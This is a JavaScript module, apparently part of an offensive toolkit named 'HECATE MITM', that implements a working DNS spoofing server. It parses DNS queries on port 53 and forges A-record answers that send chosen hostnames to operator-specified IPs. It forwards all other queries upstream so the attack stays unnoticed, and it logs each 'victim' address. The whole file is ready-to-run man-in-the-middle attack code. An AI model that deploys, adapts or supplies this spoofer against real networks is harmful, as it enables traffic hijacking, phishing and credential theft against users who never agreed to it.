'use strict';

/**
 * HECATE MITM — DNS Spoofer
 * Listens on UDP port 53 and responds to A/AAAA queries for configured
 * hostnames with operator-specified IP addresses.
 * All other queries are forwarded to upstream DNS.
 *
 * Requires elevated privileges to bind port 53 (run as root or with CAP_NET_BIND_SERVICE).
 * Upstream resolver: configurable (default 8.8.8.8:53).
 */

const dgram  = require('dgram');
const dns    = require('dns');
const { promisify } = require('util');

const resolveFwd = promisify(dns.resolve4);

// Map<hostname, spoofedIp>
const spoofMap = new Map();

let server     = null;
let _upstream  = '8.8.8.8';
let _port      = 53;
let _eventBus  = null;

function setEventBus(b)  { _eventBus = b; }
function setUpstream(ip) { _upstream = ip; }

// ── Spoof map management ──────────────────────────────────────────────────────

function addEntry(hostname, ip) {
  spoofMap.set(hostname.toLowerCase(), ip);
}

function removeEntry(hostname) {
  spoofMap.delete(hostname.toLowerCase());
}

function listEntries() {
  return Object.fromEntries(spoofMap);
}

// ── DNS packet parsing ────────────────────────────────────────────────────────

/**
 * Parse a DNS query packet.
 * Returns { id, questions: [{ name, type, class }] }
 * Handles only single-question queries (covers 99% of real traffic).
 */
function parseQuery(buf) {
  if (buf.length < 12) return null;

  const id      = buf.readUInt16BE(0);
  const flags   = buf.readUInt16BE(2);
  const qdCount = buf.readUInt16BE(4);
  const isQuery = !(flags & 0x8000);  // QR bit

  if (!isQuery || qdCount < 1) return null;

  // Parse first question
  let offset = 12;
  const labels = [];

  while (offset < buf.length) {
    const len = buf[offset];
    if (len === 0) { offset++; break; }
    if ((len & 0xC0) === 0xC0) { offset += 2; break; }   // pointer — skip
    labels.push(buf.slice(offset + 1, offset + 1 + len).toString());
    offset += 1 + len;
  }

  if (offset + 4 > buf.length) return null;

  const name  = labels.join('.').toLowerCase();
  const qtype = buf.readUInt16BE(offset);
  const qcls  = buf.readUInt16BE(offset + 2);

  return { id, name, qtype, qclass: qcls, rawQuery: buf };
}

const DNS_TYPE_A    = 1;
const DNS_TYPE_AAAA = 28;

/**
 * Build a DNS A-record response packet.
 * @param {number} id       - query transaction ID
 * @param {Buffer} question - raw question section bytes
 * @param {string} ip       - IPv4 address to return
 * @param {number} ttl      - TTL in seconds (default 60)
 */
function buildAResponse(id, questionBuf, ip, ttl = 60) {
  const ipParts = ip.split('.').map(Number);
  if (ipParts.length !== 4) throw new Error(`Invalid IPv4: ${ip}`);

  const header = Buffer.alloc(12);
  header.writeUInt16BE(id,     0);
  header.writeUInt16BE(0x8180, 2); // QR=1, OPCODE=0, AA=1, RD=1, RA=1
  header.writeUInt16BE(1,      4); // QDCOUNT = 1
  header.writeUInt16BE(1,      6); // ANCOUNT = 1
  header.writeUInt16BE(0,      8); // NSCOUNT = 0
  header.writeUInt16BE(0,      10);// ARCOUNT = 0

  // Answer RR: name pointer (0xC00C = pointer to offset 12 = question name),
  // type A, class IN, TTL, rdlength=4, rdata=IP
  const answer = Buffer.alloc(16);
  answer.writeUInt16BE(0xC00C, 0);  // name pointer to question
  answer.writeUInt16BE(DNS_TYPE_A, 2);
  answer.writeUInt16BE(1,          4);  // class IN
  answer.writeUInt32BE(ttl,        6);
  answer.writeUInt16BE(4,          10); // rdlength
  answer[12] = ipParts[0];
  answer[13] = ipParts[1];
  answer[14] = ipParts[2];
  answer[15] = ipParts[3];

  return Buffer.concat([header, questionBuf, answer]);
}

/**
 * Build a SERVFAIL response (for queries we can't or won't answer).
 */
function buildServfail(id) {
  const buf = Buffer.alloc(12);
  buf.writeUInt16BE(id,     0);
  buf.writeUInt16BE(0x8182, 2); // QR=1, RCODE=2 (SERVFAIL)
  return buf;
}

// ── Server ────────────────────────────────────────────────────────────────────

/**
 * Start the DNS spoofing server.
 * @param {object} opts
 * @param {number} opts.port     - default 53
 * @param {string} opts.host     - bind address (default '0.0.0.0')
 * @param {string} opts.upstream - upstream DNS IP
 * @returns {Promise<void>}
 */
function start(opts = {}) {
  _port     = opts.port     ?? 53;
  _upstream = opts.upstream ?? '8.8.8.8';

  return new Promise((resolve, reject) => {
    server = dgram.createSocket('udp4');

    server.on('error', reject);

    server.on('message', async (msg, rinfo) => {
      const query = parseQuery(msg);
      if (!query) return;

      const { id, name, qtype, rawQuery } = query;
      const spoofIp = spoofMap.get(name);

      // Only spoof A queries for known hosts
      if (spoofIp && qtype === DNS_TYPE_A) {
        const questionStart = 12;
        const questionBuf   = rawQuery.slice(questionStart);
        const response      = buildAResponse(id, questionBuf, spoofIp, 60);
        server.send(response, rinfo.port, rinfo.address);

        _eventBus?.emit('mitm:dns_spoofed', {
          name, spoofIp,
          victim: rinfo.address,
          ts:     new Date().toISOString(),
        });
        return;
      }

      // Forward non-spoofed queries to upstream
      await _forward(rawQuery, rinfo);
    });

    server.bind(_port, opts.host ?? '0.0.0.0', () => {
      _eventBus?.emit('mitm:dns_started', { port: _port, upstream: _upstream });
      resolve();
    });
  });
}

async function _forward(rawQuery, rinfo) {
  return new Promise(resolve => {
    const fwd = dgram.createSocket('udp4');
    const timer = setTimeout(() => { fwd.close(); resolve(); }, 3000);

    fwd.on('message', (resp) => {
      clearTimeout(timer);
      server?.send(resp, rinfo.port, rinfo.address);
      fwd.close();
      resolve();
    });

    fwd.on('error', () => { clearTimeout(timer); fwd.close(); resolve(); });
    fwd.send(rawQuery, 53, _upstream);
  });
}

function stop() {
  return new Promise(r => {
    if (!server) return r();
    server.close(r);
    server = null;
  });
}

function isRunning() { return server !== null; }

module.exports = {
  setEventBus, setUpstream,
  addEntry, removeEntry, listEntries,
  parseQuery, buildAResponse, buildServfail,
  start, stop, isRunning,
  DNS_TYPE_A, DNS_TYPE_AAAA,
};
